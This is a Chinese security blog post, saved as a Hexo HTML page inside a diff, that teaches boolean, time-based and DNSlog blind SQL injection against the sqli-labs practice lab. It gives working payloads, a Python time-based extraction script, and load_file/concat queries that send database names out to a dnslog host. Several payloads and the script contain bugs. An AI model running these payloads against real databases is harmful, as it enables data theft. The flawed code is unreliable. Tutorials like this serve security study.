@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="布尔盲注：代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，只返回right和wrong。这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的真和假来识别我们的判断是否正确，这就是布尔盲注 代码实现： 1234567891011$id &#x3D; $_GET[&amp;#x27;id&amp;#x27;];$sql &#x3D; &quot;select * from users where id &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="盲注">
+<meta property="og:url" content="http://example.com/2022/03/20/SQL/%E7%9B%B2%E6%B3%A8/index.html">
+<meta property="og:site_name" content="Hack the world">
+<meta property="og:description" content="布尔盲注：代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，只返回right和wrong。这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的真和假来识别我们的判断是否正确，这就是布尔盲注 代码实现： 1234567891011$id &#x3D; $_GET[&amp;#x27;id&amp;#x27;];$sql &#x3D; &quot;select * from users where id &#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-20T07:40:35.410Z">
+<meta property="article:modified_time" content="2022-03-20T07:41:14.135Z">
+<meta property="article:author" content="D0gekong">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2022/03/20/SQL/%E7%9B%B2%E6%B3%A8/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/03/20/SQL/%E7%9B%B2%E6%B3%A8/","path":"2022/03/20/SQL/盲注/","title":"盲注"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>盲注 | Hack the world</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hack the world</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fake it till Make it</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">布尔盲注：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.1.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%AF%AD%E5%8F%A5%EF%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">使用语句：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0%EF%BC%9A"><span class="nav-number">1.3.</span> <span class="nav-text">练习：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%EF%BC%9Asqli-lab-less-8"><span class="nav-number">1.4.</span> <span class="nav-text">环境：sqli-lab less 8</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#-1"><span class="nav-number">2.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">时间盲注：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">3.1.</span> <span class="nav-text">原理：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-2"><span class="nav-number">3.2.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%EF%BC%9A"><span class="nav-number">3.3.</span> <span class="nav-text">代码实现：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E6%84%8F%E8%BF%87%E7%A8%8B"><span class="nav-number">3.4.</span> <span class="nav-text">示意过程:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0%EF%BC%9A-1"><span class="nav-number">3.5.</span> <span class="nav-text">练习：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#-3"><span class="nav-number">4.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dnslog%E7%9B%B2%E6%B3%A8"><span class="nav-number">5.</span> <span class="nav-text">Dnslog盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0%EF%BC%9A-2"><span class="nav-number">5.1.</span> <span class="nav-text">练习：</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="D0gekong"
+      src="/images/pic.jpg">
+  <p class="site-author-name" itemprop="name">D0gekong</p>
+  <div class="site-description" itemprop="description">散人的漫漫学习路</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/SantaJiang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;SantaJiang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/jiangshengda@foxmail.com" title="E-Mail → jiangshengda@foxmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/3aa0cb901bee" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;3aa0cb901bee" rel="noopener" target="_blank"><i class="fab fa-jianshu fa-fw"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/jsd581?spm=1010.2135.3001.5421" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;jsd581?spm&#x3D;1010.2135.3001.5421" rel="noopener" target="_blank"><i class="fab fa-csdn fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/20/SQL/%E7%9B%B2%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          盲注
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-03-20 15:40:35 / 修改时间：15:41:14" itemprop="dateCreated datePublished" datetime="2022-03-20T15:40:35+08:00">2022-03-20</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h2><p>代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，只返回right和wrong。这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的真和假来识别我们的判断是否正确，这就是布尔盲注</p>
+<p>代码实现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;select * from users where id = &#x27;$id&#x27; limit 0,1&quot;;</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;wrong&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>示意过程：<br>正常请求，id=1，返回id=1的数据，错误请求id=1’，返回与正确页面不同的页面 （如果页面返回假，说明系统执行的SQL语句为假）</p>
+<p>比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and left((select version(),1)=5--+</span><br></pre></td></tr></table></figure>
+
+<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="使用语句："><a href="#使用语句：" class="headerlink" title="使用语句："></a>使用语句：</h3><ol>
+<li><p>left():left(database(),1)&gt;’s’<br>database()显示数据库名称，left(a,b)从左侧开始截取a的前b位</p>
+</li>
+<li><p>regexp:select user() regexp ‘^r’</p>
+</li>
+</ol>
+<p> 正则表达式的用法，user()结果为root,regexp为匹配root的正则表达式</p>
+<p> 3.like:select user() like ‘ro%’</p>
+<p>与regexp类似，使用like进行匹配</p>
+<p> 4.substr(),ascii():ascii(substr((select database()),1,1))=98</p>
+<p>substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将某个字符转换为ascii的值</p>
+<p> 5.ord(),mid():ord(mid((select user()),1,1))=114</p>
+<p>mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii()，将字符转为ascii值</p>
+<h3 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h3><h3 id="环境：sqli-lab-less-8"><a href="#环境：sqli-lab-less-8" class="headerlink" title="环境：sqli-lab less 8"></a>环境：sqli-lab less 8</h3><p>id=1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
+<p>回显正确you are in<br>id=1’</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; &#x27; limit 0,1</span><br></pre></td></tr></table></figure>
+<p>回显消失<br>id=1’ and ‘1’ = ‘1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = &#x27;1&#x27; and &#x27;1&#x27; =&#x27;1&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
+<p>回显正确you are in<br>将后者的逻辑判断改为2，回显消失，可以判断存在sql注入漏洞</p>
+<p>使用left()来进行尝试</p>
+<p>id=1’ and left((select database()),1)=’s’–+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and left((select database()),1)=&#x27;s&#x27; --&#x27;limit 0,1</span><br></pre></td></tr></table></figure>
+<p>回显成功you are in<br>通过此类方法就能对库名，表名，列名进行查询</p>
+<p>对表名查询</p>
+<p>id=1’ and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=’e’–+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and left((select  table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>回显成功 判断正确<br>注入流程就是这样，我们可以使用BP进一步提升效率，为字符添加变量，自动化跑（注意下数据库命名规则是a-z,0-9,_</p>
+<p>尝试切换为regexp试试</p>
+<p>id=1’ and (select database()) regexp ‘^s’ –+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = &#x27;1&#x27; and (select database()) regexp &#x27;^s&#x27; --+&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
+<p>回显成功判断正确<br>id=1’ and (select table_name from information_schema.tables where table_schema=database() limit 0,1),1) regexp ‘^e’ –+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 0,1),1) regexp &#x27;^e&#x27; --+&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
+<p>回显成功判断正确，如果要判断第二位，就直接在e后面加上自己想测的字符<br>切换为like</p>
+<p>id=1’ and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like ‘e%’ –+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and(select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#x27;e%&#x27; --+ limit 0,1</span><br></pre></td></tr></table></figure>
+<p>这种表示匹配以e开头的字符串，后面同理regexp<br>切换为substr以及ascii</p>
+<p>id=1’ and ascii(substr((select database()),1,1) = 115 –+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and ascii(substr((select database()),1,1) = 98 --+&#x27; limit ,1</span><br></pre></td></tr></table></figure>
+<p>截取了从第一位字符开始长度为一的字符的ascii并判断是否等于115，这里是回显成功判断正确<br>然后查表</p>
+<p>id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) = 115 –+</p>
+<p>这里回显失败判断错误，就可以借助Bp爆破字符了，爆破可得101时正确，接着调整字符长度和ASCII的值，直至爆破结束</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，语句执行后也不提示真假，我们不能通过页面的内容来进行判断，这里我们可以通过构造语句，通过页面响应的时长，来判断信息，这就是时间盲注</p>
+<h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h3 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &#x27;select * from users where id=&#x27;$id&#x27; limit 0,1&#x27;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="示意过程"><a href="#示意过程" class="headerlink" title="示意过程:"></a>示意过程:</h3><p>登陆正常请求，name=admin&amp;pwd=1返回登陆成功的页面,在不知道账号密码的情况发送登录请求，返回登陆失败的页面，构造sql语句，发送登陆请求，返回登陆失败页面，构造语句让程序延时执行，判断信息</p>
+<p>构造逻辑语句，通过条件语句进行判断，为真则立即执行，否则延时执行</p>
+<p>核心语法：if(left(user(),1)=’a’,0,sleep(3));通过sql语句取到某个值，用left去user左侧的第一个字符，如果等于a，就立即执行，错误就延时3秒执行</p>
+<p>真实场景:if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</p>
+<p>插入想要查询的数据，进行字符串截取，再进行比对</p>
+<h3 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h3><p>环境:sqli-lab less10</p>
+<p>id=1 id=1’ id=1’ and ‘1’ =’2</p>
+<p>进行一些简单的逻辑判断，均为一致的回显</p>
+<p>采取上述时间盲注</p>
+<p>id=1’ and if(left(user(),1)=’a’,0,sleep(3))–+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and if(left(user(),1)=&#x27;a&#x27; , 0 ,sleep(3))--+&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
+<p>很明显页面延迟了刷新，将字符a变为r，页面立即执行，通过这种方式就能对数据库的数据进行查询<br>id=1’ and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=’e’,0,sleep(3))–+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27;,0,sleep(3))--+&#x27; limit 0 ,1</span><br></pre></td></tr></table></figure>
+<p>页面立即执行了，可见就是表名第一个字符就是E，但是这种效率会比较低这里对时间盲注比较推荐使用工具或者脚本<br>时间盲注脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url=&#x27;&#x27;</span><br><span class="line">database=&#x27;select schema_name from information_schema.schemata&#x27;</span><br><span class="line">column = &#x27;select column_name from information_schema.columns where table_name=&quot;table_name&quot;&#x27;</span><br><span class="line">table = &#x27;select table_name from information_schema.tables where table_schema=database()&#x27;</span><br><span class="line"></span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    for j in range(48,122):</span><br><span class="line">        payload = &#x27;&quot; and if(ascii(substr((&#123;&#125; limit 0,1),&#123;&#125;,1),sleep(2),1)--+&#x27;.format(database,i,j)</span><br><span class="line">        stime=time.time()</span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        etime = time.time()</span><br><span class="line">        if etime-stime ==2:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<p>这里脚本先对库名进行爆破，爆完库名修改为表名，列名即可</p>
+<h2 id="-3"><a href="#-3" class="headerlink" title></a></h2><h2 id="Dnslog盲注"><a href="#Dnslog盲注" class="headerlink" title="Dnslog盲注"></a>Dnslog盲注</h2><p>每个网站都有对应的域名比如<a target="_blank" rel="noopener" href="https://www.test.com,每/">test.com</a> ，同样每个域名都有对应的ip地址，而将ip地址与域名这两者互相转换的中间人就是DNS，这两者每次转换都会留下一定的记录，我们就可以将这个称为dnslog，其实就是记录用户访问域名的信息</p>
+<p>原理：代码存在sql注入漏洞，然而页面既不会回显数据，也不会回显错误信息，我们可以通过布尔以及时间盲注获得内容，但整个过程效率低，需要发送很多请求进行判断，很可能触发安全设备的防护，所以需要一种方式减少请求，直接回显数据，这里可以使用dnslog实现注入</p>
+<p>代码实现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;select * from users where id = &#x27;$id&#x27; limit 0,1&quot;;</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;wrong&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>平台:ceye.io dns在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息比如 curl xx.dnsurl，xx这里就是我们可以自主输入的命令字符，如果输入的whoami,就会返回当前用户<br>另外mysql的load_file可以发起请求</p>
+<p>例子:select load_file(concat(‘\\‘,’test’,’mysql.dnsurl\abc’));</p>
+<p>构造语句,利用Load_file函数发起请求，使用dnslog接受请求，获取数据</p>
+<p>核心语法:select load_file(concat(‘\\‘,(select database(),’mysql.dnsurl\abc’));</p>
+<p>通过sql语句查询内容，作为请求的一部分发送至dnslog，只要对这一部分的语句进行构造，就能实现有回显的sql注入，值得注意的是，这些数据格式和内容都有限制，需要处理</p>
+<h3 id="练习：-2"><a href="#练习：-2" class="headerlink" title="练习："></a>练习：</h3><p>环境：sqli-lab less9</p>
+<p>id=1 或者其他逻辑判断</p>
+<p>回显无效无法判断，如果有注入点就必然是盲注</p>
+<p>采取dnslog盲注</p>
+<p>id=1’ and select load_file(concat(‘\\‘,(select database(),’mysql.dnsurl\abc’));</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id =&#x27;1&#x27; and select load_file(concat(&#x27;\\\\&#x27;,(select database(),&#x27;mysql.dnsurl\\abc&#x27;));--+&#x27;</span><br></pre></td></tr></table></figure>
+<p>前去dnslog平台就可以看到库名<br>然后查表名</p>
+<p>id=1’ and select load_file(concat(‘\\‘,(select table_name from information_schema.tables where table_schema=database() limit 0,1),’mysql.dnsurl\abc’));–+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;id=1&#x27; and select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;mysql.dnsurl\\abc&#x27;));--+&#x27;</span><br></pre></td></tr></table></figure>
+<p>可以看到表名，列名就按照老套路继续走<br>但是其实效率还是不高，推荐使用脚本跑</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/03/19/SQL/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="prev" title="报错注入">
+                  <i class="fa fa-chevron-left"></i> 报错注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/20/SQL/%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5/" rel="next" title="其他注入">
+                  其他注入 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D0gekong</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
